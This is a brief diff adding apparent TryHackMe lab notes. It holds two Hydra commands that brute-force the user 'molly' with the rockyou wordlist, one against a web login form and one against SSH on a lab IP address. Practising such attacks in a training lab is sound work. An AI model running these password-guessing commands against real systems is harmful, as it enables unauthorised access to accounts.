@@ -1,0 +1,6 @@
+tryhackme hydra
+ hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.49.199 http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect."
+
+
+hydra -l molly -P /usr/share/wordlists/rockyou.txt ssh://10.10.49.199 -V
+
